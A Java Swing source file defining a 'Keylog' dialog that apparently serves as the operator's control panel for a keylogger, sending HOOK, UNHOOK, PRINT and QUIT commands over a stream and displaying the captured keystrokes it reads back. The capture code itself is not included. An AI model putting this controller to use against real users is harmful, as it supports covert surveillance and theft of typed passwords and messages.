package org.example;

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.IOException;
import java.lang.annotation.Native;

public class Keylog extends JDialog {
    private JPanel contentPane;
    private JButton hookButton;
    private JButton unhookButton;
    private JButton printKeyButton;
    private JButton clearViewButton;
    private JTextArea textArea1;

    public Keylog() {
        InitializePicComponent();
    }

    public void InitializePicComponent() {
        setContentPane(contentPane);
        setModal(true);
        getRootPane().setDefaultButton(hookButton);
        textArea1.setEditable(false);
        unhookButton.setEnabled(false);
        this.pack();
        this.setTitle("Keystroke Form");

        hookButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                hookButtonClick();
            }
        });

        unhookButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                unhookButtonClick();
            }
        });
        clearViewButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                clearViewButtonClick();
            }
        });
        printKeyButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                printKeyButtonClick();
            }
        });

        // call onCancel() when cross is clicked
        setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
        addWindowListener(new WindowAdapter() {
            public void windowClosing(WindowEvent e) {
                onCancel();
            }
        });

        // call onCancel() on ESCAPE
        contentPane.registerKeyboardAction(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                onCancel();
            }
        }, KeyStroke.getKeyStroke(KeyEvent.VK_ESCAPE, 0), JComponent.WHEN_ANCESTOR_OF_FOCUSED_COMPONENT);
    }

    private void hookButtonClick() {
        String s = "HOOK";
        hookButton.setEnabled(false);
        unhookButton.setEnabled(true);
        try {
            Program.nw.write(s);
            Program.nw.newLine();
            Program.nw.flush();


        } catch (IOException e)
        {
            System.out.println(e);

        }
    }

    private void unhookButtonClick() {
        String s = "UNHOOK";
        unhookButton.setEnabled(false);
        hookButton.setEnabled(true);
        try {
            Program.nw.write(s);
            Program.nw.newLine();
            Program.nw.flush();


        } catch (IOException e)
        {
            System.out.println(e);

        }
    }

    private void clearViewButtonClick() {
        textArea1.setText("");
    }

    private void printKeyButtonClick() {
        String s = "PRINT";
        textArea1.setText("");
        try {
            Program.nw.write(s);
            Program.nw.newLine();
            Program.nw.flush();
            String line = "";
            while (!line.equals("[END_OF_STRING_BUFFER]"))
            {
                line = Program.nr.readLine();
                if (!line.equals("[END_OF_STRING_BUFFER]")) {
                    textArea1.append(line);
                    textArea1.append("\n");
                }
            }
            line = "";
        } catch (IOException e)
        {
            System.out.println(e);

        }
    }




    private void onCancel() {
        String s = "QUIT";
        try {
            Program.nw.write(s);
            Program.nw.newLine();
            Program.nw.flush();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        // add your code here if necessary
        dispose();
    }

//    public static void main(String[] args) {
//        Keylog dialog = new Keylog();
//        dialog.pack();
//        dialog.setVisible(true);
//        System.exit(0);
}
